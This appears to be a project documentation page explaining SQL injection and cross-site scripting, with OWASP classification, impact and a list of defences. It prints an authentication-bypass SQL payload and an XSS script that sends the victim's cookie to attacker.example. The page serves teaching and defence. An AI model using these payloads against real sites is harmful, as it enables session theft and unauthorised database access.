# Injection Attacks (SQLi, XSS)

> Injection attacks manipulate an application by embedding malicious data or code into a query or document that the interpreter executes with unintended authority.

## What it is

Injection vulnerabilities arise when an application forwards untrusted input to an interpreter — a database engine, an HTML renderer, an OS shell — without first sanitising or contextually encoding that input. The interpreter cannot distinguish the attacker-supplied payload from the legitimate instruction stream, so it executes both. SQL Injection (SQLi) targets relational databases by rewriting the SQL statement an application intends to run. Cross-Site Scripting (XSS) targets the browser by injecting a script into a page that another user's client will render and execute. Both share the same root cause: data and control channels are conflated. The attack surface is any user-controlled value that reaches an interpreter: form fields, URL parameters, HTTP headers, JSON bodies, cookie values, and file upload metadata.

## How the attack works

**SQL Injection — classic in-band example**

1. The application builds a query by concatenating a user-supplied value directly into a SQL string:
   ```sql
   SELECT * FROM users WHERE username = '<input>' AND password = '<input>';
   ```
2. An attacker supplies `' OR '1'='1` as the username and an arbitrary password.
3. The resulting query becomes logically tautological:
   ```sql
   SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything';
   ```
4. The database returns all rows; the application treats the first row as a successful authentication and grants access.
5. With `UNION`-based or error-based payloads, the attacker can enumerate table names, extract column data, and — on misconfigured servers — invoke file-system or OS-level commands.

**Illustrative (non-weaponised) XSS example**

A comment field that echoes input back without encoding allows:
```html
<!-- attacker input stored in the database -->
<script>document.location='https://attacker.example/steal?c='+document.cookie</script>
```
When any user views that comment, the browser executes the script in the origin of the vulnerable site, sending the victim's session cookie to an attacker-controlled endpoint. The victim sees nothing unusual.

## Real-world impact

Injection vulnerabilities have consistently held the top position in OWASP's risk rankings across multiple report cycles. A widely documented breach class involves e-commerce and financial platforms where SQL Injection against insufficiently parameterised login or search endpoints led to full database dumps — exposing hashed credentials, personally identifiable information, and payment-card metadata for millions of users. OWASP documents the typical impact categories as: unauthorised data read, data modification, authentication bypass, and, in worst cases, remote command execution on the database host. For a representative documented incident and impact analysis, see the OWASP SQL Injection community page ([https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)).

## OWASP classification

- **Category:** OWASP Top 10 — A03:2021 Injection (previously A1 in the 2017 edition)
- **Cheat Sheets:**
  - SQL Injection Prevention: [https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
  - XSS Prevention: [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- **Community page (WAF context):** [https://owasp.org/www-community/Web_Application_Firewall](https://owasp.org/www-community/Web_Application_Firewall)

## How defenders stop it

- **Parameterised queries / prepared statements** — the single most effective SQLi control; the database driver separates data from instruction at the protocol level so concatenation is structurally impossible.
- **Contextual output encoding** — encode all untrusted data before rendering it into an HTML, JavaScript, CSS, or URL context; do not rely on a single global escape function.
- **Input validation on ingress** — enforce type, length, and allow-list constraints before data reaches any interpreter, but treat this as defence-in-depth, not a primary control.
- **Content Security Policy (CSP)** — a response header that instructs the browser to refuse inline scripts and restrict which origins may load resources, materially reducing XSS blast radius even when injection succeeds.
- **Least-privilege database accounts** — application credentials should have only `SELECT`/`INSERT`/`UPDATE` on the tables they need; `DROP`, `EXEC xp_cmdshell`, and schema-level grants must be withheld.
- **Web Application Firewall (WAF) rule sets** — a WAF operating in front of the application can detect and block known injection patterns (ModSecurity Core Rule Set, AWS WAF managed rules, Cloudflare WAF, etc.) as a complementary layer, not a substitute for fixing the application itself.
- **Dependency and framework updates** — ORM and template-engine patches frequently close injection vectors in lower-level handling; keep the dependency graph current.
- **Security-focused code review and SAST** — static analysis tools (Semgrep, CodeQL) flag concatenated queries and unencoded output sinks before code reaches production.

In this project, see the defenses: [grobase](../defense/grobase/web-application-firewall.md).

## References

- OWASP — Web Application Firewall: [https://owasp.org/www-community/Web_Application_Firewall](https://owasp.org/www-community/Web_Application_Firewall)
- OWASP — SQL Injection attack reference: [https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- OWASP — SQL Injection Prevention Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- OWASP — XSS Prevention Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- OWASP — Top 10 A03:2021 Injection: [https://owasp.org/Top10/A03_2021-Injection/](https://owasp.org/Top10/A03_2021-Injection/)
